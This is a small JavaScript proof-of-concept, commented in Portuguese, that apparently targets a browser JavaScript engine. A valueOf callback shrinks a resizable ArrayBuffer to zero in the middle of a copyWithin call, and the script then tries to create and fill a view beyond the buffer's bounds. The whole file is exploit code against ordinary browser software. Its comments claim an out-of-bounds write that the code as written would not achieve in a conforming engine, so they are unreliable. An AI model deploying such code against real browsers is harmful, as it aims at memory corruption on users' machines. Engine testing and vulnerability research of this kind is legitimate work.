(function() {
    function log(msg) {
        const p = document.createElement("p");
        p.textContent = msg;
        document.body.appendChild(p);
    }

    try {
        const ab = new ArrayBuffer(0x1000, { "maxByteLength": 0x10000 });
        const u8 = new Uint8Array(ab);

        log("Inicial - ab.byteLength: " + ab.byteLength);

        const call_back = function () {
            log("Callback executado. Tentando reduzir o buffer...");
            try {
                ab.resize(0);  // Tenta reduzir o buffer para 0
                log("Resize bem-sucedido.");
            } catch (e) {
                log("Erro ao tentar resize: " + e);
            }
            return 0;
        };

        // A operação de copyWithin agora tenta acessar dados fora do limite do ArrayBuffer
        u8.copyWithin(0x20, { valueOf: call_back });

        // Tentando escrever além do limite alocado do buffer
        log("Tentando escrever fora do limite do buffer...");
        const overflowData = new Uint8Array(ab, 0x1000, 0x2000);  // Tentando acessar memória além do limite

        // Escrevendo dados no buffer além dos limites
        for (let i = 0; i < overflowData.length; i++) {
            overflowData[i] = i & 0xFF;  // Preenchendo a memória além do limite com valores
        }

        log("Após tentativa de buffer overflow - ab.byteLength: " + ab.byteLength);

    } catch (e) {
        log("Erro geral: " + e);
    }
})();
